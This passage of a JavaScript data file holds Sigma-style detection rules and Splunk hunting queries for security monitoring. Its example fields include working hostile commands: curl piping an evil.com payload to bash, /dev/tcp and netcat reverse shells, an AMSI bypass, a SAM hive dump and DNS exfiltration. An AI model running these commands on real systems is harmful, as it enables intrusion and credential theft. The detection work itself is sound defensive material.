    title: 'Encoded PowerShell Command',
    id: 'sigma-022',
    level: 'medium',
    description: 'Detects execution of base64 encoded PowerShell commands used to obfuscate malicious activity.',
    logsource: 'Windows Security / Sysmon / PowerShell',
    detection: 'powershell.exe or pwsh.exe with -EncodedCommand, -enc, -e, or -ec parameter',
    falsepositives: 'Some enterprise management tools use encoded commands',
    tags: ['attack.execution', 'attack.t1059.001'],
    example: 'powershell.exe -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4A'
  },
  {
    title: 'Credential Dumping via Registry',
    id: 'sigma-023',
    level: 'high',
    description: 'Detects credential access by saving SAM, SYSTEM, or SECURITY registry hives.',
    logsource: 'Windows Security / Sysmon',
    detection: 'reg.exe with "save" and "hklm\\sam" or "hklm\\system" or "hklm\\security", or use of esentutl.exe for ntds.dit extraction',
    falsepositives: 'Legitimate backup operations by authorized administrators',
    tags: ['attack.credential_access', 'attack.t1003.002'],
    example: 'reg save hklm\\sam C:\\temp\\sam.hive'
  },
  {
    title: 'Suspicious Parent-Child Process Relationship',
    id: 'sigma-024',
    level: 'high',
    description: 'Detects unusual parent-child process relationships that indicate exploitation or malware execution.',
    logsource: 'Sysmon / Windows Security',
    detection: 'winword.exe, excel.exe, or outlook.exe spawning cmd.exe, powershell.exe, wscript.exe, cscript.exe, mshta.exe, or rundll32.exe',
    falsepositives: 'Some legitimate Office macros and add-ins',
    tags: ['attack.execution', 'attack.t1204.002'],
    example: 'ParentImage: WINWORD.EXE | Image: cmd.exe /c powershell.exe -nop -w hidden -c "IEX(...)"'
  },
  {
    title: 'Ransomware File Extension Modifications',
    id: 'sigma-025',
    level: 'critical',
    description: 'Detects mass file extension changes characteristic of ransomware encryption.',
    logsource: 'Sysmon / File Monitoring',
    detection: 'Multiple file rename events (>20 in 60 seconds) changing extensions to known ransomware extensions (.encrypted, .locked, .crypto, .crypt, .enc, .locky, .zepto, .cerber, .dharma, .ryuk)',
    falsepositives: 'Batch file rename operations by administrators',
    tags: ['attack.impact', 'attack.t1486'],
    example: 'Rapid file renames: document.docx -> document.docx.encrypted (repeated across directories)'
  },
  {
    title: 'Bloodhound/SharpHound Collection',
    id: 'sigma-026',
    level: 'high',
    description: 'Detects execution of BloodHound/SharpHound Active Directory enumeration tool.',
    logsource: 'Windows Security / Sysmon',
    detection: 'Process creation containing SharpHound, BloodHound, or Invoke-BloodHound in command line. Also detect high volume LDAP queries from single source.',
    falsepositives: 'Authorized AD audit tools',
    tags: ['attack.discovery', 'attack.t1087.002'],
    example: 'SharpHound.exe -c All -d domain.com --zipfilename output.zip'
  },
  {
    title: 'SSH Brute Force Detection',
    id: 'sigma-027',
    level: 'medium',
    description: 'Detects SSH brute force attempts from auth.log or secure log analysis.',
    logsource: 'Linux Auth Log',
    detection: 'More than 5 "Failed password for" entries from the same source IP within 60 seconds in /var/log/auth.log or /var/log/secure',
    falsepositives: 'Automated backup systems with expired credentials',
    tags: ['attack.credential_access', 'attack.t1110'],
    example: 'sshd[12345]: Failed password for root from 10.0.0.100 port 22 ssh2 (repeated 50 times in 30 seconds)'
  },
  {
    title: 'Web Shell Detection',
    id: 'sigma-028',
    level: 'critical',
    description: 'Detects web server processes spawning suspicious child processes indicating web shell activity.',
    logsource: 'Sysmon / Linux Auditd',
    detection: 'w3wp.exe, httpd, apache2, nginx spawning cmd.exe, powershell.exe, bash, sh, or python. Also detect POST requests to newly created files in web directories.',
    falsepositives: 'CGI scripts, legitimate server-side processing',
    tags: ['attack.persistence', 'attack.t1505.003'],
    example: 'ParentProcess: apache2 | ChildProcess: /bin/bash -c "id; cat /etc/passwd"'
  },
  {
    title: 'Suspicious Cron Job Modification',
    id: 'sigma-029',
    level: 'medium',
    description: 'Detects modifications to cron jobs or crontab files that could indicate persistence.',
    logsource: 'Linux Auth / Syslog',
    detection: 'crontab command with -e flag from non-root users, new files created in /etc/cron.d/, /etc/cron.daily/, or /var/spool/cron/, or syslog entries showing "REPLACE" or "INSTALL" from CRON',
    falsepositives: 'Legitimate cron job management by administrators',
    tags: ['attack.persistence', 'attack.t1053.003'],
    example: 'CRON[1234]: (www-data) REPLACE (www-data) -- followed by reverse shell command in crontab'
  },
  {
    title: 'Data Exfiltration over DNS',
    id: 'sigma-030',
    level: 'high',
    description: 'Detects potential data exfiltration via DNS queries with encoded data in subdomain labels.',
    logsource: 'DNS Server / Network',
    detection: 'DNS TXT queries to unusual domains, high frequency of unique subdomains to a single domain, subdomain labels containing hex or base64 patterns',
    falsepositives: 'DKIM verification, SPF lookups, some CDN services',
    tags: ['attack.exfiltration', 'attack.t1048.003'],
    example: 'DNS Query: c2VjcmV0ZGF0YQ.exfil.evil.com (base64 encoded data in subdomain)'
  },
  {
    title: 'Netcat Reverse Shell',
    id: 'sigma-031',
    level: 'high',
    description: 'Detects netcat or ncat execution with flags commonly used for reverse shells.',
    logsource: 'Sysmon / Linux Auditd',
    detection: 'Process creation of nc, ncat, or netcat with -e, -c, or combined with /bin/sh or /bin/bash, or mkfifo pipe patterns',
    falsepositives: 'Legitimate network testing and file transfer',
    tags: ['attack.execution', 'attack.t1059'],
    example: 'nc -e /bin/sh 10.0.0.1 4444'
  },
  {
    title: 'Suspicious chmod or chattr Usage',
    id: 'sigma-032',
    level: 'medium',
    description: 'Detects suspicious permission changes or file attribute modifications on Linux systems.',
    logsource: 'Linux Auditd / Syslog',
    detection: 'chmod with setuid/setgid flags (4755, 2755, u+s, g+s), or chattr +i on non-standard files',
    falsepositives: 'Legitimate software installation and configuration',
    tags: ['attack.persistence', 'attack.t1548.001'],
    example: 'chmod u+s /tmp/backdoor; chattr +i /etc/resolv.conf'
  },
  {
    title: 'Suspicious curl or wget Download',
    id: 'sigma-033',
    level: 'low',
    description: 'Detects curl or wget downloading files to suspicious locations or piping to shell.',
    logsource: 'Linux Auditd / Syslog',
    detection: 'curl or wget with output to /tmp/, /dev/shm/, or piped to bash/sh. Also detect -k or --insecure flag combined with execution.',
    falsepositives: 'Package installation, legitimate downloads',
    tags: ['attack.execution', 'attack.t1105'],
    example: 'curl http://evil.com/payload.sh | bash'
  },
  {
    title: 'Windows Admin Share Access',
    id: 'sigma-034',
    level: 'medium',
    description: 'Detects access to administrative network shares (C$, ADMIN$, IPC$) from non-standard sources.',
    logsource: 'Windows Security',
    detection: 'EventID 5140 or 5145 with ShareName containing C$, ADMIN$, or IPC$ from external IP addresses',
    falsepositives: 'Legitimate admin tools, SCCM, enterprise management software',
    tags: ['attack.lateral_movement', 'attack.t1021.002'],
    example: 'EventID: 5140 | ShareName: \\\\*\\C$ | IpAddress: 10.0.0.50 | SubjectUserName: admin'
  },
  {
    title: 'Suspicious MSBuild Execution',
    id: 'sigma-035',
    level: 'medium',
    description: 'Detects MSBuild.exe used to execute code, a known application whitelisting bypass technique.',
    logsource: 'Windows Security / Sysmon',
    detection: 'MSBuild.exe executing .xml or .csproj files from unusual directories (temp, downloads, appdata)',
    falsepositives: 'Legitimate developer build processes',
    tags: ['attack.defense_evasion', 'attack.t1127.001'],
    example: 'C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\MSBuild.exe C:\\temp\\payload.xml'
  },
  {
    title: 'AMSI Bypass Attempt',
    id: 'sigma-036',
    level: 'high',
    description: 'Detects attempts to bypass the Antimalware Scan Interface (AMSI) in PowerShell.',
    logsource: 'PowerShell Script Block Logging',
    detection: 'Script block containing "AmsiUtils", "amsiInitFailed", "AmsiScanBuffer", or known AMSI bypass patterns',
    falsepositives: 'Security testing tools that include AMSI bypass checks',
    tags: ['attack.defense_evasion', 'attack.t1562.001'],
    example: '[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiInitFailed","NonPublic,Static").SetValue($null,$true)'
  },
  {
    title: 'Suspicious File Creation in System Directories',
    id: 'sigma-037',
    level: 'medium',
    description: 'Detects creation of executable files in system directories by non-system processes.',
    logsource: 'Sysmon / File Monitoring',
    detection: 'File creation events for .exe, .dll, .sys, .bat, .cmd, .ps1 in C:\\Windows\\, C:\\Windows\\System32\\, or C:\\Windows\\SysWOW64\\ by non-Windows processes',
    falsepositives: 'Software installation, Windows Updates',
    tags: ['attack.persistence', 'attack.t1036.005'],
    example: 'Sysmon EventID 11: TargetFilename: C:\\Windows\\System32\\evil.dll | Process: C:\\temp\\dropper.exe'
  },
  {
    title: 'RDP Tunneling via SSH',
    id: 'sigma-038',
    level: 'high',
    description: 'Detects RDP connections being tunneled through SSH for lateral movement or exfiltration.',
    logsource: 'Windows Security / Network',
    detection: 'RDP connection (EventID 4624 LogonType 10) from localhost (127.0.0.1) combined with active SSH tunnel, or plink.exe execution with -L or -R flags',
    falsepositives: 'Legitimate remote administration through jump hosts',
    tags: ['attack.lateral_movement', 'attack.t1021.001'],
    example: 'plink.exe -L 3389:target:3389 user@jumphost followed by mstsc /v:127.0.0.1'
  },
  {
    title: 'Cobalt Strike Beacon Indicators',
    id: 'sigma-039',
    level: 'critical',
    description: 'Detects indicators of Cobalt Strike beacon activity in network or process telemetry.',
    logsource: 'Network / Sysmon',
    detection: 'HTTP requests with Cobalt Strike default URI patterns (/cm, /cx, /pixel, /__utm.gif), named pipes matching \\\\MSSE-*, or process injection patterns typical of beacon',
    falsepositives: 'Very rare; some URI patterns may match legitimate analytics endpoints',
    tags: ['attack.command_and_control', 'attack.t1071.001'],
    example: 'HTTP GET /__utm.gif with Cookie header containing encoded beacon data'
  },
  {
    title: 'Suspicious WinRM Activity',
    id: 'sigma-040',
    level: 'medium',
    description: 'Detects Windows Remote Management (WinRM) being used for lateral movement.',
    logsource: 'Windows Security / PowerShell',
    detection: 'EventID 4624 LogonType 3 followed by wsmprovhost.exe execution, or PowerShell Enter-PSSession/Invoke-Command usage targeting remote hosts',
    falsepositives: 'Legitimate remote PowerShell administration',
    tags: ['attack.lateral_movement', 'attack.t1021.006'],
    example: 'Invoke-Command -ComputerName target -ScriptBlock { whoami }'
  },
  {
    title: 'Potential Privilege Escalation via Named Pipe Impersonation',
    id: 'sigma-041',
    level: 'high',
    description: 'Detects creation of named pipes with names that match known privilege escalation tools.',
    logsource: 'Sysmon',
    detection: 'Sysmon EventID 17 (Pipe Created) with PipeName matching known attack tool patterns or service names',
    falsepositives: 'Some legitimate services create similar named pipes',
    tags: ['attack.privilege_escalation', 'attack.t1134'],
    example: 'Sysmon EventID 17: PipeName: \\\\spoolss | Image: C:\\temp\\printbug.exe'
  },
  {
    title: 'Linux Reverse Shell Detection',
    id: 'sigma-042',
    level: 'critical',
    description: 'Detects common Linux reverse shell patterns in process execution and bash history.',
    logsource: 'Linux Auditd / Syslog',
    detection: 'Process execution containing "/dev/tcp/", "bash -i", "python -c import socket", "socat exec", or "php -r fsockopen"',
    falsepositives: 'Health check scripts that test network connectivity',
    tags: ['attack.execution', 'attack.t1059.004'],
    example: 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'
  },
  {
    title: 'Suspicious Registry Persistence via AppInit_DLLs',
    id: 'sigma-043',
    level: 'high',
    description: 'Detects modifications to AppInit_DLLs registry key for DLL injection persistence.',
    logsource: 'Sysmon / Windows Security',
    detection: 'Registry modification to HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\AppInit_DLLs or LoadAppInit_DLLs',
    falsepositives: 'Some legacy applications and security products',
    tags: ['attack.persistence', 'attack.t1546.010'],
    example: 'Sysmon EventID 13: TargetObject: HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\AppInit_DLLs'
  },
  {
    title: 'Suspicious Process Hollowing',
    id: 'sigma-044',
    level: 'high',
    description: 'Detects process hollowing technique where a legitimate process is started suspended and its memory is replaced.',
    logsource: 'Sysmon',
    detection: 'Process creation with CREATE_SUSPENDED flag followed by WriteProcessMemory and NtResumeThread API calls to the same target process',
    falsepositives: '.NET JIT compilation, some development tools',
    tags: ['attack.defense_evasion', 'attack.t1055.012'],
    example: 'svchost.exe started suspended by non-services.exe parent, then memory written and resumed'
  },
  {
    title: 'Suspicious Access to Sensitive Files',
    id: 'sigma-045',
    level: 'high',
    description: 'Detects access attempts to sensitive system files like /etc/shadow, /etc/passwd, SAM database.',
    logsource: 'Linux Auditd / Sysmon',
    detection: 'File read access to /etc/shadow, /etc/gshadow, or Windows SAM database by non-privileged processes, or access to .ssh/authorized_keys, .bash_history',
    falsepositives: 'Legitimate system administration tools, PAM modules',
    tags: ['attack.credential_access', 'attack.t1003.008'],
    example: 'auditd: type=SYSCALL op=open file=/etc/shadow exe=/tmp/enum uid=33'
  },
  {
    title: 'DNS Zone Transfer Attempt',
    id: 'sigma-046',
    level: 'medium',
    description: 'Detects DNS zone transfer (AXFR) requests which could indicate reconnaissance activity.',
    logsource: 'DNS Server / Network',
    detection: 'DNS query type AXFR or IXFR from non-authorized sources',
    falsepositives: 'Legitimate secondary DNS server zone transfers',
    tags: ['attack.reconnaissance', 'attack.t1590.002'],
    example: 'dig axfr domain.com @ns1.domain.com -- from unauthorized source IP'
  },
  {
    title: 'Port Scanning Activity',
    id: 'sigma-047',
    level: 'medium',
    description: 'Detects port scanning activity from connection patterns in firewall or network logs.',
    logsource: 'Firewall / Network',
    detection: 'Single source IP connecting to more than 20 different destination ports on the same host within 60 seconds, or connecting to the same port on more than 20 different hosts',
    falsepositives: 'Vulnerability scanners, network monitoring tools',
    tags: ['attack.reconnaissance', 'attack.t1046'],
    example: 'Source: 10.0.0.50 connecting to 192.168.1.1 ports 21,22,23,25,53,80,110,135,139,443,445,... in 5 seconds'
  },
  {
    title: 'Suspicious LDAP Query',
    id: 'sigma-048',
    level: 'medium',
    description: 'Detects LDAP queries commonly used by AD enumeration tools for reconnaissance.',
    logsource: 'Windows Security / AD',
    detection: 'LDAP queries for all user accounts, all computer accounts, all group memberships, or queries for adminCount=1, servicePrincipalName=*',
    falsepositives: 'Legitimate AD administration and inventory tools',
    tags: ['attack.discovery', 'attack.t1087.002'],
    example: 'LDAP Query: (&(objectCategory=person)(objectClass=user)(adminCount=1))'
  },
  {
    title: 'Fileless Malware via Mshta',
    id: 'sigma-049',
    level: 'high',
    description: 'Detects mshta.exe used to execute malicious HTA content for fileless malware delivery.',
    logsource: 'Windows Security / Sysmon',
    detection: 'mshta.exe with URL parameter, vbscript:Execute, javascript:, or loading content from unusual locations',
    falsepositives: 'Legitimate HTA applications in enterprise environments',
    tags: ['attack.execution', 'attack.t1218.005'],
    example: 'mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""powershell -ep bypass..."", 0:close")'
  },
  {
    title: 'Shadow Credentials Attack',
    id: 'sigma-050',
    level: 'critical',
    description: 'Detects Shadow Credentials attack where an attacker modifies msDS-KeyCredentialLink attribute.',
    logsource: 'Windows Security',
    detection: 'EventID 5136 with AttributeLDAPDisplayName msDS-KeyCredentialLink being modified by non-Azure AD Connect accounts',
    falsepositives: 'Windows Hello for Business enrollment, Azure AD Connect',
    tags: ['attack.credential_access', 'attack.t1556'],
    example: 'EventID: 5136 | AttributeLDAPDisplayName: msDS-KeyCredentialLink | ObjectDN: CN=victim,CN=Users,DC=domain,DC=com'
  },
];

const SPLUNK_QUERIES = [
  {
    title: 'Failed Login Attempts by User',
    description: 'Find all failed login attempts grouped by username to identify brute force targets.',
    query: 'index=security sourcetype=WinEventLog:Security EventCode=4625 | stats count by Account_Name, Source_Network_Address | sort -count',
    category: 'Authentication'
  },
  {
    title: 'Successful Logins After Multiple Failures',
    description: 'Detect accounts that successfully logged in after multiple failed attempts (potential compromise).',
    query: 'index=security sourcetype=WinEventLog:Security (EventCode=4625 OR EventCode=4624) | transaction Account_Name maxspan=30m | where eventcount>5 AND EventCode=4624 | table _time Account_Name Source_Network_Address eventcount',
    category: 'Authentication'
  },
  {
    title: 'Logon Type Distribution',
    description: 'Analyze the distribution of logon types to identify unusual authentication patterns.',
    query: 'index=security sourcetype=WinEventLog:Security EventCode=4624 | eval LogonType=case(Logon_Type=2,"Interactive",Logon_Type=3,"Network",Logon_Type=4,"Batch",Logon_Type=5,"Service",Logon_Type=7,"Unlock",Logon_Type=8,"NetworkCleartext",Logon_Type=9,"NewCredentials",Logon_Type=10,"RemoteInteractive",Logon_Type=11,"CachedInteractive") | stats count by LogonType | sort -count',
    category: 'Authentication'
  },
  {
    title: 'New Service Installations',
    description: 'Monitor for newly installed services which could indicate persistence mechanisms.',
    query: 'index=security sourcetype=WinEventLog:System EventCode=7045 | table _time Service_Name Service_File_Name Service_Type Service_Start_Type | sort -_time',
    category: 'Persistence'
  },
  {
    title: 'PowerShell Script Block Logging',
    description: 'Search PowerShell script block logs for suspicious commands and keywords.',
    query: 'index=security sourcetype="WinEventLog:Microsoft-Windows-PowerShell/Operational" EventCode=4104 | search ScriptBlockText="*Invoke-Mimikatz*" OR ScriptBlockText="*Invoke-Expression*" OR ScriptBlockText="*DownloadString*" OR ScriptBlockText="*EncodedCommand*" | table _time ComputerName ScriptBlockText',
    category: 'Execution'
  },
  {
    title: 'Account Lockouts',
    description: 'Track account lockout events to identify brute force attempts or misconfigured services.',
    query: 'index=security sourcetype=WinEventLog:Security EventCode=4740 | table _time Account_Name Caller_Computer_Name | sort -_time',
    category: 'Authentication'
  },
  {
    title: 'Suspicious Process Creation',
    description: 'Detect suspicious process creation events with common attack tool names.',
    query: 'index=security sourcetype=WinEventLog:Security EventCode=4688 | search New_Process_Name="*mimikatz*" OR New_Process_Name="*psexec*" OR New_Process_Name="*procdump*" OR New_Process_Name="*lazagne*" OR New_Process_Name="*bloodhound*" | table _time Creator_Process_Name New_Process_Name Process_Command_Line Account_Name',
    category: 'Execution'
  },
  {
    title: 'Network Connections to Suspicious Ports',
    description: 'Monitor for outbound connections to ports commonly used by malware (C2, RATs).',
    query: 'index=network sourcetype=firewall action=allowed dest_port IN (4444,5555,6666,8888,1234,31337,12345,54321) | stats count by src_ip dest_ip dest_port | sort -count',
    category: 'Network'
  },
  {
    title: 'Large Data Transfers',
    description: 'Identify unusually large data transfers that could indicate exfiltration.',
    query: 'index=network sourcetype=firewall | stats sum(bytes_out) as total_bytes by src_ip dest_ip | where total_bytes > 104857600 | eval MB=round(total_bytes/1048576,2) | table src_ip dest_ip MB | sort -MB',
    category: 'Exfiltration'
  },
  {
    title: 'DNS Query Anomalies',
    description: 'Detect unusually long DNS queries that may indicate DNS tunneling or exfiltration.',
    query: 'index=dns sourcetype=dns | eval query_length=len(query) | where query_length > 50 | stats count by query src_ip | sort -count | head 50',
    category: 'Network'
  },
  {
    title: 'Scheduled Task Creation',
    description: 'Monitor creation of scheduled tasks for persistence detection.',
    query: 'index=security sourcetype=WinEventLog:Security EventCode=4698 | table _time SubjectUserName TaskName TaskContent | sort -_time',
    category: 'Persistence'
  },
  {
    title: 'Registry Run Key Modifications',
    description: 'Detect modifications to registry Run keys used for persistence.',
    query: 'index=sysmon sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=13 TargetObject="*\\CurrentVersion\\Run*" | table _time Image TargetObject Details | sort -_time',
    category: 'Persistence'
  },
  {
    title: 'File Creation in Temp Directories',
    description: 'Monitor for executable file creation in temporary directories.',
    query: 'index=sysmon sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=11 (TargetFilename="*\\Temp\\*.exe" OR TargetFilename="*\\Temp\\*.dll" OR TargetFilename="*\\Temp\\*.bat" OR TargetFilename="*\\Temp\\*.ps1") | table _time Image TargetFilename | sort -_time',
    category: 'Execution'
  },
  {
    title: 'Remote Desktop Connections',
    description: 'Track all RDP connection events for lateral movement analysis.',
    query: 'index=security sourcetype=WinEventLog:Security EventCode=4624 Logon_Type=10 | table _time Account_Name Source_Network_Address Workstation_Name | sort -_time',
    category: 'Lateral Movement'
  },
  {
    title: 'User Account Changes',
    description: 'Monitor all user account management events for unauthorized modifications.',
    query: 'index=security sourcetype=WinEventLog:Security (EventCode=4720 OR EventCode=4722 OR EventCode=4723 OR EventCode=4724 OR EventCode=4725 OR EventCode=4726 OR EventCode=4738 OR EventCode=4740) | table _time EventCode Account_Name Target_Account_Name SubjectUserName | sort -_time',
    category: 'Account Management'
  },
  {
    title: 'Group Membership Changes',
    description: 'Track additions and removals from security groups, especially privileged groups.',
    query: 'index=security sourcetype=WinEventLog:Security (EventCode=4728 OR EventCode=4729 OR EventCode=4732 OR EventCode=4733 OR EventCode=4756 OR EventCode=4757) | table _time EventCode MemberName Group_Name SubjectUserName | sort -_time',
    category: 'Account Management'
  },
  {
    title: 'Cleared Event Logs',
    description: 'Detect clearing of event logs which is a key anti-forensic indicator.',
    query: 'index=security sourcetype=WinEventLog:Security EventCode=1102 | table _time SubjectUserName SubjectDomainName SubjectLogonId | sort -_time',
    category: 'Defense Evasion'
  },
  {
    title: 'Suspicious Parent-Child Processes',
    description: 'Identify processes spawned by unusual parents like Office applications running cmd or PowerShell.',
    query: 'index=sysmon sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=1 (ParentImage="*\\WINWORD.EXE" OR ParentImage="*\\EXCEL.EXE" OR ParentImage="*\\OUTLOOK.EXE" OR ParentImage="*\\POWERPNT.EXE") (Image="*\\cmd.exe" OR Image="*\\powershell.exe" OR Image="*\\wscript.exe" OR Image="*\\cscript.exe" OR Image="*\\mshta.exe") | table _time ParentImage Image CommandLine User',
    category: 'Execution'
  },
  {
    title: 'SMB Lateral Movement',
    description: 'Detect lateral movement via SMB by monitoring admin share access.',
    query: 'index=security sourcetype=WinEventLog:Security EventCode=5140 (ShareName="\\\\*\\C$" OR ShareName="\\\\*\\ADMIN$") | table _time SubjectUserName IpAddress ShareName | sort -_time',
    category: 'Lateral Movement'
  },
  {
    title: 'Unusual Outbound Traffic by Process',
    description: 'Identify processes making outbound connections that do not typically connect to the internet.',
    query: 'index=sysmon sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=3 NOT (Image="*\\chrome.exe" OR Image="*\\firefox.exe" OR Image="*\\msedge.exe" OR Image="*\\svchost.exe") DestinationIsIpv6=false | where NOT cidrmatch("10.0.0.0/8", DestinationIp) AND NOT cidrmatch("172.16.0.0/12", DestinationIp) AND NOT cidrmatch("192.168.0.0/16", DestinationIp) | stats count by Image DestinationIp DestinationPort | sort -count',
    category: 'Network'
  },
  {
    title: 'Encoded PowerShell Execution',
    description: 'Detect execution of base64 encoded PowerShell commands.',
    query: 'index=sysmon sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=1 Image="*\\powershell.exe" (CommandLine="*-enc*" OR CommandLine="*-EncodedCommand*" OR CommandLine="*-e *" OR CommandLine="*FromBase64*") | table _time User CommandLine ParentImage',
    category: 'Execution'
  },
  {
    title: 'WMI Remote Execution',
    description: 'Detect WMI-based remote command execution used in lateral movement.',
    query: 'index=sysmon sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=1 (Image="*\\WMIC.exe" CommandLine="*/node:*") OR (ParentImage="*\\WmiPrvSE.exe" (Image="*\\cmd.exe" OR Image="*\\powershell.exe")) | table _time User ParentImage Image CommandLine',
    category: 'Lateral Movement'
  },
  {
    title: 'Credential Dump Tool Detection',
    description: 'Detect known credential dumping tools by command line arguments.',
    query: 'index=sysmon sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=1 (CommandLine="*sekurlsa*" OR CommandLine="*lsadump*" OR CommandLine="*privilege::debug*" OR CommandLine="*procdump*lsass*" OR CommandLine="*comsvcs*MiniDump*") | table _time User Image CommandLine',
    category: 'Credential Access'
  },
  {
    title: 'Firewall Rule Changes',
    description: 'Monitor changes to Windows Firewall rules that may indicate defense evasion.',
    query: 'index=security sourcetype=WinEventLog:Security (EventCode=4946 OR EventCode=4947 OR EventCode=4948 OR EventCode=4950) | table _time EventCode RuleName RuleAttr SubjectUserName | sort -_time',
    category: 'Defense Evasion'
  },
  {
    title: 'LSASS Access Monitoring',
    description: 'Detect processes accessing LSASS memory for credential dumping.',
    query: 'index=sysmon sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=10 TargetImage="*\\lsass.exe" NOT (SourceImage="*\\csrss.exe" OR SourceImage="*\\svchost.exe" OR SourceImage="*\\MsMpEng.exe") | table _time SourceImage GrantedAccess CallTrace | sort -_time',
    category: 'Credential Access'
  },
  {
    title: 'Suspicious certutil Usage',
    description: 'Detect certutil.exe abuse for file download or encoding.',
    query: 'index=sysmon sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=1 Image="*\\certutil.exe" (CommandLine="*-urlcache*" OR CommandLine="*-decode*" OR CommandLine="*-encode*" OR CommandLine="*-decodehex*") | table _time User CommandLine',
    category: 'Defense Evasion'
  },
  {
    title: 'Top Talkers by Bandwidth',
    description: 'Identify the top bandwidth consumers on the network.',
    query: 'index=network sourcetype=firewall | stats sum(bytes) as total_bytes by src_ip | eval GB=round(total_bytes/1073741824,3) | sort -total_bytes | head 20 | table src_ip GB',
    category: 'Network'
  },
  {
    title: 'HTTP Error Codes by Source',
    description: 'Analyze HTTP error responses grouped by source IP to identify scanning or exploitation.',
    query: 'index=web sourcetype=access_combined status>=400 | stats count by clientip status | where count > 10 | sort -count | table clientip status count',
    category: 'Web'
  },
  {
    title: 'SQL Injection Attempt Detection',
    description: 'Detect potential SQL injection attempts in web access logs.',
    query: 'index=web sourcetype=access_combined (uri="*SELECT*" OR uri="*UNION*" OR uri="*INSERT*" OR uri="*DROP*" OR uri="*OR 1=1*" OR uri="*\' OR*" OR uri="*--*" OR uri="*;--*") | table _time clientip uri status | sort -_time',
    category: 'Web'
  },
  {
    title: 'XSS Attempt Detection',
    description: 'Detect potential cross-site scripting attempts in web access logs.',
    query: 'index=web sourcetype=access_combined (uri="*<script*" OR uri="*javascript:*" OR uri="*onerror=*" OR uri="*onload=*" OR uri="*alert(*" OR uri="*document.cookie*") | table _time clientip uri status | sort -_time',
    category: 'Web'
  },
  {
    title: 'Directory Traversal Attempts',
    description: 'Detect path traversal attack attempts in web logs.',
    query: 'index=web sourcetype=access_combined (uri="*../*" OR uri="*..\\*" OR uri="*%2e%2e*" OR uri="*%252e%252e*") | stats count by clientip uri status | sort -count',
    category: 'Web'
  },
  {
    title: 'Web Shell Detection in Access Logs',
    description: 'Identify potential web shell activity from HTTP access patterns.',
    query: 'index=web sourcetype=access_combined method=POST (uri="*.php" OR uri="*.jsp" OR uri="*.asp" OR uri="*.aspx") status=200 | stats count dc(uri) as unique_uris by clientip | where count > 50 AND unique_uris < 3 | table clientip count unique_uris',
    category: 'Web'
  },
  {
    title: 'User Agent Anomalies',
    description: 'Identify suspicious or unusual user agents in web access logs.',
    query: 'index=web sourcetype=access_combined | stats count by useragent | where count < 10 OR match(useragent, "(?i)(sqlmap|nikto|nmap|dirbuster|gobuster|wfuzz|hydra|metasploit|burp|scanner|bot|crawler)") | sort -count | table useragent count',
    category: 'Web'
  },
  {
    title: 'Kerberos TGT Request Anomalies',
    description: 'Detect unusual TGT request patterns that may indicate credential theft.',
    query: 'index=security sourcetype=WinEventLog:Security EventCode=4768 | stats count by IpAddress Account_Name Result_Code | where count > 20 OR Result_Code!="0x0" | sort -count | table IpAddress Account_Name Result_Code count',
    category: 'Authentication'
  },
  {
    title: 'Kerberoasting Detection',
    description: 'Detect potential Kerberoasting by monitoring service ticket requests with RC4 encryption.',
    query: 'index=security sourcetype=WinEventLog:Security EventCode=4769 Ticket_Encryption_Type=0x17 NOT Service_Name="krbtgt" NOT Service_Name="*$" | stats count by Account_Name Service_Name Client_Address | where count > 3 | sort -count',
    category: 'Credential Access'
  },
  {
    title: 'AS-REP Roasting Detection',
    description: 'Detect AS-REP roasting attempts targeting accounts without pre-authentication.',
    query: 'index=security sourcetype=WinEventLog:Security EventCode=4768 Result_Code=0x0 Pre_Authentication_Type=0 | stats count by Account_Name IpAddress | sort -count',
    category: 'Credential Access'
  },
  {
    title: 'DNS Exfiltration Detection',
    description: 'Detect potential DNS-based data exfiltration by monitoring query volume and length.',
    query: 'index=dns sourcetype=dns query_type=TXT | eval query_length=len(query) | stats count avg(query_length) as avg_len max(query_length) as max_len dc(query) as unique_queries by src_ip | where avg_len > 40 OR unique_queries > 100 | sort -unique_queries',
    category: 'Exfiltration'
  },
  {
    title: 'Process Injection Detection',
    description: 'Detect process injection via Sysmon CreateRemoteThread events.',
    query: 'index=sysmon sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=8 NOT (SourceImage="*\\csrss.exe" OR SourceImage="*\\lsass.exe" OR SourceImage="*\\services.exe") | table _time SourceImage TargetImage StartModule StartFunction | sort -_time',
    category: 'Defense Evasion'
  },
  {
    title: 'Suspicious DLL Loading',
    description: 'Detect DLL loading from unusual directories that could indicate DLL hijacking.',
    query: 'index=sysmon sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=7 NOT (ImageLoaded="C:\\Windows\\*" OR ImageLoaded="C:\\Program Files*") ImageLoaded="*.dll" | stats count by Image ImageLoaded | sort -count | head 50',
    category: 'Persistence'
  },
  {
    title: 'Network Share Enumeration',
    description: 'Detect enumeration of network shares which is common in reconnaissance.',
    query: 'index=security sourcetype=WinEventLog:Security EventCode=5140 | stats dc(ShareName) as share_count by SubjectUserName IpAddress | where share_count > 5 | sort -share_count',
    category: 'Discovery'
  },
  {
    title: 'Unusual Service Account Activity',
    description: 'Detect interactive logons by service accounts which should only perform network logons.',
    query: 'index=security sourcetype=WinEventLog:Security EventCode=4624 (Logon_Type=2 OR Logon_Type=10) Account_Name="svc_*" OR Account_Name="service_*" | table _time Account_Name Logon_Type Source_Network_Address Workstation_Name',
    category: 'Authentication'
